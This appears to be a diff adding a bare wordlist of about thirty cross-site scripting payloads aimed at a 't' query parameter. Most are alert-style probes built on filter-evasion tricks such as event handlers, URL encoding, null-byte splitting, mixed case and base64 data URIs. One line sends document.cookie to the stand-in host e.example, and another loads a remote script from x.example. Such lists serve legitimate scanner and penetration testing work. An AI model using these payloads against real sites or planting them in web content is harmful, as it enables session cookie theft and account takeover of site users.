@@ -1,0 +1,30 @@
+/page?t=<script>alert(1)</script>
+/page?t=<script>new Image().src='//e.example/?'+document.cookie</script>
+/page?t=<img src=x onerror=confirm(1)>
+/page?t=<img src onerror=alert`1`>
+/page?t=<svg onload=alert(1)//
+/page?t=<svg/onload=top['al'+'ert'](1)>
+/page?t=<iframe src="data:text/html,<script>alert(1)</script>">
+/page?t=<body onresize=alert(1)>
+/page?t=<input onblur=alert(1) autofocus><input autofocus>
+/page?t=<video src=x onloadstart=alert(1)>
+/page?t=<div style=animation-name:x onanimationstart=alert(1)>
+/page?t=<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>x</a>
+/page?t=<math href="javascript:alert(1)">x</math>
+/page?t=<form><button formaction=javascript:alert(1)>X
+/page?t=%3Cimg%20src%3D1%20onerror%3Dalert(1)%3E
+/page?t=%3Cscript%3Eprompt(1)%3C/script%3E
+/page?t=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+/page?t='-alert(1)-'
+/page?t=\"-alert(1)}//
+/page?t=<scr%00ipt>alert(1)</scr%00ipt>
+/page?t=<SCRIPT SRC=//x.example/a.js></SCRIPT>
+/page?t=<img src=x:alert(alt) onerror=eval(src) alt=1>
+/page?t=<object data="javascript:alert(1)">
+/page?t=<isindex type=image src=1 onerror=alert(1)>
+/page?t=<bgsound src=javascript:alert(1)>
+/page?t=<table background=javascript:alert(1)>
+/page?t=<link rel=import href="data:text/html,<script>alert(1)</script>">
+/page?t=<audio controls ondurationchange=alert(1)><source src=x.mp3></audio>
+/page?t=<svg><set onbegin=alert(1) attributename=x>
+/page?t=<img src=x oNeRrOr=alert(1)>
